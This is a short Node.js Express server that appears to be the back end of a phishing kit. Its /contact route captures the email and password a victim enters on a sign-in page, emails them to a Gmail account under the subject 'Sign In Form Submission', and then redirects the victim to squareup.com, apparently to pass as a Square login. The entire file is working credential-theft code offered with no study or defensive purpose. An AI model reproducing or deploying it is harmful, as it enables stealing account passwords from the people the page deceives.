require("dotenv").config();
const express = require("express");
const nodeMail = require("nodemailer");
const path = require("path");

const app = express();

// app.use(express.urlencoded({ extended: true }));
// app.use(express.static(path.join(__dirname, "static")));
app.use(express.static('static'))
app.use(express.json());
app.use(express.urlencoded({
    extended: true
  }))
// app.use(express.urlencoded());

async function mainMail(name, email, subject, message) {
  const transporter = await nodeMail.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.PASSWORD,
    },
  });
  const mailOption = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: subject,
    html: `Sign In Form submitted with data:<br>  
    ${message}`,
  };
  try {
    await transporter.sendMail(mailOption);
    return Promise.resolve("Message Sent Successfully!");
  } catch (error) {
    return Promise.reject(error);
  }
}

app.get("/", (req, res) => {
//    res.send("Index");
  res.sendFile("index.html");
});


app.post("/contact", async (req, res, next) => {
  try {
    await mainMail("Franklin Williams", "jason.puth2015@gmail.com", "Sign In Form Submission", "Email: " + req.body.email + ", Password: " + req.body.password);    
    res.redirect('http://squareup.com/');
  } catch (error) {
    res.redirect('/');
  }
    
});

app.listen(process.env.PORT || 5000, () => console.log("Server is running!"));
